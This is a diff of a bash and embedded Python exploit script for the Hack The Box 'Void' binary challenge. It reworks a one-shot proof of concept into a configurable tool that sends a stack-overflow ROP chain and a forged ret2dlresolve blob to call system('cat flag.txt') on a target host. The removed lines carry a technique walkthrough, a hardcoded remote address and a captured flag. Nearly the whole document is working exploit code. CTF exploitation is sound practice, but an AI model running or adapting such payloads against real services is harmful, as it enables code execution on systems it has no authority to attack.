@@ -2,85 +2,136 @@
 
 set -euo pipefail
 
-# Challenge: Void
-# Platform: Hack The Box - CTF Try Out
-# Category: Pwn / Binary Exploitation
+# -----------------------------------------------------------------------------
+# PoC: Hack The Box - Void
+# Type: Stack overflow + ret2dlresolve -> system("cat flag.txt")
 #
-# Scenario summary:
-# The binary is intentionally tiny. It only calls one vulnerable function:
-#
-#   void vuln() {
-#       char buf[0x40];
-#       read(0, buf, 0xc8);
-#   }
-#
-# That gives us a classic stack overflow:
-#   - buffer size: 0x40 = 64 bytes
-#   - saved rbp:   8 bytes
-#   - saved rip:   overwrite starts at offset 72
-#
-# Why this challenge is trickier than the earlier warmups:
-# There is no obvious win() function and almost no imported functions.
-# The binary imports only:
-#   - read
-#   - __libc_start_main
-#
-# So we cannot do the usual:
-#   - ret2win
-#   - puts leak -> libc base -> system
-#   - open/read/write chain using existing PLT entries
-#
-# Intended technique:
-#   ret2dlresolve
-#
-# What ret2dlresolve means in practice:
-# We abuse the ELF dynamic linker itself to resolve a function that the binary
-# did not originally import. In this challenge we ask the linker to resolve
-# "system" at runtime, then we call:
-#
-#   system("cat flag.txt")
-#
-# That prints the flag directly to our socket.
-#
-# Real-world concept:
-# Dynamic linking metadata is executable logic, not just passive bookkeeping.
-# If an attacker can control instruction flow and enough stack state, they can
-# trick the loader into resolving functions on demand and turn a "very small"
-# binary into a fully weaponized one.
-#
-# How the chain was built:
-# The binary has useful gadgets:
-#   - pop rdi; ret
-#   - pop rsi; pop r15; ret
-#   - read@plt
-#   - plt0 (the dynamic resolver trampoline)
-#
-# The exploit uses a two-part payload:
-#
-# 1. Primary ROP chain at offset 72:
-#    - call read(0, data_addr, len(second_stage))
-#    - call the resolver trampoline with a forged relocation index
-#
-# 2. Second-stage ret2dlresolve blob:
-#    - fake symbol table entry for "system"
-#    - fake relocation entry
-#    - argument string "cat flag.txt"
-#
-# For portability in your archive, this script contains the exact final raw
-# bytes of both stages rather than requiring pwntools at runtime. Those bytes
-# were generated from the shipped binary itself, so the script still works as a
-# normal one-shot Linux PoC.
-#
-# Remote target used during solve:
-#   - 154.57.164.65:31666
-#
-# Final live flag obtained during testing:
-#   HTB{pwnt00l5_h0mep4g3_15_u54ful}
+# This script is intended for authorized CTF infrastructure only.
+# -----------------------------------------------------------------------------
 
-HOST="${1:-154.57.164.65}"
-PORT="${2:-31666}"
+readonly SCRIPT_NAME="$(basename "$0")"
+readonly DEFAULT_TIMEOUT=8
+readonly DEFAULT_STAGE_DELAY=0.20
 
-python3 - "$HOST" "$PORT" <<'PY'
+HOST=""
+PORT=""
+TIMEOUT="${DEFAULT_TIMEOUT}"
+STAGE_DELAY="${DEFAULT_STAGE_DELAY}"
+JSON_OUTPUT=0
+VERBOSE=0
+
+usage() {
+  cat <<USAGE
+Usage:
+  ${SCRIPT_NAME} <host> <port>
+  ${SCRIPT_NAME} --host <host> --port <port> [options]
+
+Options:
+  --host <host>              Target host/IP
+  --port <port>              Target TCP port
+  --timeout <seconds>        Socket timeout (default: ${DEFAULT_TIMEOUT})
+  --stage-delay <seconds>    Delay between stage1 and stage2 (default: ${DEFAULT_STAGE_DELAY})
+  --json                     Print result as JSON
+  --verbose                  Enable debug output
+  -h, --help                 Show this help message
+
+Exit codes:
+  0  Success (flag extracted)
+  1  Generic failure
+  2  Invalid arguments
+  3  Connectivity/protocol failure
+  4  Exploit sent but flag not found
+USAGE
+}
+
+log_info() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[*] %s\n' "$*" >&2
+  fi
+}
+
+log_debug() {
+  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[D] %s\n' "$*" >&2
+  fi
+}
+
+log_error() {
+  printf '[-] %s\n' "$*" >&2
+}
+
+parse_args() {
+  local positional=()
+
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      --host)
+        HOST="${2:-}"
+        shift 2
+        ;;
+      --port)
+        PORT="${2:-}"
+        shift 2
+        ;;
+      --timeout)
+        TIMEOUT="${2:-}"
+        shift 2
+        ;;
+      --stage-delay)
+        STAGE_DELAY="${2:-}"
+        shift 2
+        ;;
+      --json)
+        JSON_OUTPUT=1
+        shift
+        ;;
+      --verbose)
+        VERBOSE=1
+        shift
+        ;;
+      -h|--help)
+        usage
+        exit 0
+        ;;
+      -* )
+        log_error "Unknown option: $1"
+        usage >&2
+        exit 2
+        ;;
+      *)
+        positional+=("$1")
+        shift
+        ;;
+    esac
+  done
+
+  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
+    HOST="${positional[0]}"
+  fi
+  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
+    PORT="${positional[1]}"
+  fi
+
+  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
+    log_error "Host and port are required."
+    usage >&2
+    exit 2
+  fi
+
+  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
+    log_error "Invalid port: ${PORT}"
+    exit 2
+  fi
+}
+
+main() {
+  parse_args "$@"
+
+  log_info "Target: ${HOST}:${PORT}"
+  log_debug "Sending prebuilt two-stage ret2dlresolve payload"
+
+  python3 - "$HOST" "$PORT" "$TIMEOUT" "$STAGE_DELAY" "$JSON_OUTPUT" "$VERBOSE" <<'PY'
+import json
 import re
 import socket
 import sys
@@ -88,35 +139,81 @@ import time
 
 host = sys.argv[1]
 port = int(sys.argv[2])
+timeout = float(sys.argv[3])
+stage_delay = float(sys.argv[4])
+json_output = sys.argv[5] == "1"
+verbose = sys.argv[6] == "1"
 
-# Stage 1: overflow buffer and place the primary ROP chain at offset 72.
-stage1 = bytes.fromhex('6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161bb114000000000000000000000000000b911400000000000004e400000000000696161616a6161613010400000000000bb11400000000000584e40000000000020104000000000001603000000000000')
 
-# Stage 2: exact forged ret2dlresolve payload that resolves system("cat flag.txt").
-stage2 = bytes.fromhex('73797374656d006163616161646161616561616166616161704a000000000000000000000000000000000000000000006d6161616e6161616f61616170616161004e400000000000070000001f030000000000000000000063617420666c61672e74787400')
+def emit_debug(msg: str) -> None:
+    if verbose and not json_output:
+        print(f"[D] {msg}", file=sys.stderr)
 
-with socket.create_connection((host, port), timeout=8) as s:
-    s.sendall(stage1)
-    time.sleep(0.2)
-    s.sendall(stage2)
-    time.sleep(0.5)
-    s.settimeout(2)
+
+def fail(code: int, msg: str) -> None:
+    if json_output:
+        print(json.dumps({"ok": False, "error": msg, "target": f"{host}:{port}"}))
+    else:
+        print(f"[-] {msg}", file=sys.stderr)
+    raise SystemExit(code)
+
+
+# Stage 1: overflow + primary ROP for read() and resolver trampoline.
+stage1 = bytes.fromhex(
+    "6161616162616161636161616461616165616161666161616761616168616161"
+    "696161616a6161616b6161616c6161616d6161616e6161616f6161617061616171"
+    "61616172616161bb114000000000000000000000000000b911400000000000004e"
+    "400000000000696161616a6161613010400000000000bb11400000000000584e40"
+    "000000000020104000000000001603000000000000"
+)
+
+# Stage 2: forged ret2dlresolve blob for system("cat flag.txt").
+stage2 = bytes.fromhex(
+    "73797374656d006163616161646161616561616166616161704a000000000000000000000000000000000000000000006d6161616e6161616f61616170616161004e400000000000070000001f030000000000000000000063617420666c61672e74787400"
+)
+
+emit_debug(f"stage1_len={len(stage1)} stage2_len={len(stage2)}")
+
+try:
+    sock = socket.create_connection((host, port), timeout=timeout)
+except Exception as exc:
+    fail(3, f"Connection failed: {exc}")
+
+try:
+    sock.settimeout(timeout)
+    sock.sendall(stage1)
+    time.sleep(stage_delay)
+    sock.sendall(stage2)
+
     chunks = []
-    while True:
+    end = time.time() + timeout
+    while time.time() < end:
         try:
-            data = s.recv(4096)
+            data = sock.recv(4096)
         except socket.timeout:
             break
         if not data:
             break
         chunks.append(data)
+finally:
+    sock.close()
 
-output = b"".join(chunks).decode("latin-1", errors="ignore")
-match = re.search(r"HTB\{[^}]+\}", output)
+text = b"".join(chunks).decode("latin1", errors="ignore")
+match = re.search(r"HTB\{[^}]+\}", text)
 
 if not match:
-    print(output)
-    raise SystemExit("[-] Flag not found in response.")
+    if verbose and not json_output:
+        print("[D] Response preview:", file=sys.stderr)
+        print(text[:800], file=sys.stderr)
+    fail(4, "Flag pattern not found in target response")
 
-print(match.group(0))
+flag = match.group(0)
+
+if json_output:
+    print(json.dumps({"ok": True, "target": f"{host}:{port}", "flag": flag}))
+else:
+    print(flag)
 PY
+}
+
+main "$@"
